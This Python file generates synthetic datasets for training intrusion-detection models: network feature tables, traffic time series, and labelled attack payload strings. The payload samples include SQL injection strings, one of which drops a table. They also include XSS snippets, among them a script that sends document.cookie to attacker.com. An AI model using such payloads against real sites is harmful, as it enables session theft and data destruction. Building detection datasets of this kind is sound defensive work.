import numpy as np
import pandas as pd
import random

def generate_cyber_tabular_dataset(num_samples=2000):
    """
    Generates synthetic tabular network feature dataset matching NSL-KDD/CICIDS2017 schema.
    Features: duration, src_bytes, dst_bytes, wrong_fragment, urgent, hot, num_failed_logins,
              logged_in, num_compromised, root_shell, count, srv_count, serror_rate, rerror_rate, etc.
    Labels: 0 (Low Severity / Normal), 1 (Medium), 2 (High), 3 (Critical Severity)
    """
    np.random.seed(42)
    random.seed(42)

    X = []
    y = []

    for _ in range(num_samples):
        sev_class = np.random.choice([0, 1, 2, 3], p=[0.45, 0.25, 0.18, 0.12])
        
        if sev_class == 0:  # Low / Normal
            duration = np.random.exponential(scale=2.0)
            src_bytes = np.random.normal(loc=350, scale=100)
            dst_bytes = np.random.normal(loc=1200, scale=300)
            failed_logins = 0
            count = np.random.randint(1, 15)
            serror_rate = np.random.uniform(0.0, 0.05)
            rerror_rate = np.random.uniform(0.0, 0.05)
            hot = 0
        elif sev_class == 1:  # Medium (Minor Probe / Recon)
            duration = np.random.exponential(scale=5.0)
            src_bytes = np.random.normal(loc=120, scale=50)
            dst_bytes = np.random.normal(loc=0, scale=10)
            failed_logins = np.random.choice([0, 1])
            count = np.random.randint(20, 80)
            serror_rate = np.random.uniform(0.1, 0.3)
            rerror_rate = np.random.uniform(0.1, 0.4)
            hot = np.random.randint(0, 2)
        elif sev_class == 2:  # High (XSS / Brute Force / Unauthorized Access)
            duration = np.random.exponential(scale=12.0)
            src_bytes = np.random.normal(loc=1500, scale=400)
            dst_bytes = np.random.normal(loc=4500, scale=1000)
            failed_logins = np.random.randint(3, 15)
            count = np.random.randint(50, 150)
            serror_rate = np.random.uniform(0.2, 0.6)
            rerror_rate = np.random.uniform(0.2, 0.5)
            hot = np.random.randint(2, 6)
        else:  # Critical (DDoS / SQLi Remote Code Exec / Malware C2)
            duration = np.random.exponential(scale=0.5)
            src_bytes = np.random.normal(loc=15000, scale=5000)
            dst_bytes = np.random.normal(loc=200, scale=100)
            failed_logins = np.random.randint(10, 50)
            count = np.random.randint(200, 1000)
            serror_rate = np.random.uniform(0.7, 1.0)
            rerror_rate = np.random.uniform(0.6, 1.0)
            hot = np.random.randint(5, 15)

        # 10 numeric tabular features
        row = [
            max(0, duration),
            max(0, src_bytes),
            max(0, dst_bytes),
            failed_logins,
            count,
            serror_rate,
            rerror_rate,
            hot,
            np.random.uniform(0, 1),
            np.random.uniform(0, 1)
        ]
        X.append(row)
        y.append(sev_class)

    feature_cols = ['duration', 'src_bytes', 'dst_bytes', 'failed_logins', 'count',
                    'serror_rate', 'rerror_rate', 'hot', 'same_srv_rate', 'diff_srv_rate']
    return pd.DataFrame(X, columns=feature_cols), np.array(y)


def generate_time_series_sequences(num_sequences=1500, seq_len=10):
    """
    Generates time-series traffic sequences for LSTM anomaly detector.
    Output: X of shape (num_sequences, seq_len, 4), y of binary anomalies (0 or 1).
    """
    np.random.seed(42)
    X = []
    y = []

    for _ in range(num_sequences):
        is_anomaly = np.random.choice([0, 1], p=[0.70, 0.30])
        seq = []
        base_packets = 50.0
        base_bytes = 2000.0

        for t in range(seq_len):
            if is_anomaly and t >= seq_len // 2:
                # Spike anomaly in packet sequence
                pkts = base_packets + np.random.normal(loc=800, scale=200)
                bytes_cnt = base_bytes + np.random.normal(loc=50000, scale=10000)
                err_rate = np.random.uniform(0.7, 1.0)
                cpu_load = np.random.uniform(85, 99)
            else:
                pkts = base_packets + np.random.normal(loc=10, scale=5)
                bytes_cnt = base_bytes + np.random.normal(loc=200, scale=50)
                err_rate = np.random.uniform(0.0, 0.05)
                cpu_load = np.random.uniform(10, 35)

            seq.append([max(0, pkts), max(0, bytes_cnt), err_rate, cpu_load])

        X.append(seq)
        y.append(is_anomaly)

    return np.array(X), np.array(y)


def generate_payload_text_dataset(num_samples=1600):
    """
    Generates text payload samples for CNN attack recognition model.
    Classes:
    0: Normal Traffic
    1: SQL Injection (SQLi)
    2: SYN Flood DDoS
    3: Cross-Site Scripting (XSS)
    4: SSH Brute Force
    """
    random.seed(42)

    normal_templates = [
        "GET /index.html HTTP/1.1 User-Agent: Mozilla/5.0",
        "POST /api/login username=john.doe&auth_token=a9f8e72c",
        "GET /products/view?id=4821&category=electronics HTTP/1.1",
        "GET /static/images/logo.png Accept: image/png",
        "POST /contact/submit name=Alice&email=alice@company.com"
    ]

    sqli_templates = [
        "SELECT * FROM users WHERE username = 'admin' OR '1'='1'; --",
        "GET /user?id=1 UNION SELECT null, username, password FROM accounts",
        "POST /login user=admin' AND 1=conv(substr(hex(default_role()),1,16),16,10)--",
        "SELECT * FROM products WHERE cat_id = 5; DROP TABLE audit_logs;",
        "GET /search?q=test' AND SLEEP(5)--"
    ]

    ddos_templates = [
        "SYN_FLOOD_STREAM: dst_ip=10.0.0.1 dst_port=80 pps=150000 flags=SYN window=64240",
        "UDP_FLOOD_TRAFFIC packet_len=1400 dst_port=53 pps=220000 high_volume_spike",
        "HTTP_GET_FLOOD target=/api/heavy_report count=50000_req_per_sec",
        "ICMP_ECHO_REQUEST_FLOOD bandwidth_usage=980Mbps target_gateway=192.168.1.1"
    ]

    xss_templates = [
        "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>",
        "GET /profile?name=<svg/onload=alert('XSS_EXPLOIT')>",
        "<img src=x onerror=javascript:eval(atob('YWxlcnQoMSk='))>",
        "POST /comment body=<iframe src='javascript:alert(1)'></iframe>"
    ]

    bruteforce_templates = [
        "SSH-2.0-OpenSSH_8.2 - Failed password for invalid user root from 192.168.1.105 port 44892",
        "FTP_AUTH_FAILURE: 15 consecutive login failures for account admin",
        "POST /api/v1/auth - 50 failed attempts within 10s from IP 198.51.100.42",
        "PAM_UNIX_AUTH_FAIL: authentication failure for service sshd user admin"
    ]

    payloads = []
    labels = []

    templates_map = {
        0: normal_templates,
        1: sqli_templates,
        2: ddos_templates,
        3: xss_templates,
        4: bruteforce_templates
    }

    for _ in range(num_samples):
        cls = random.choice([0, 1, 2, 3, 4])
        tmpl = random.choice(templates_map[cls])
        # Add random noise/variability
        payload = f"{tmpl} [rand_id={random.randint(1000, 9999)}]"
        payloads.append(payload)
        labels.append(cls)

    return payloads, np.array(labels)
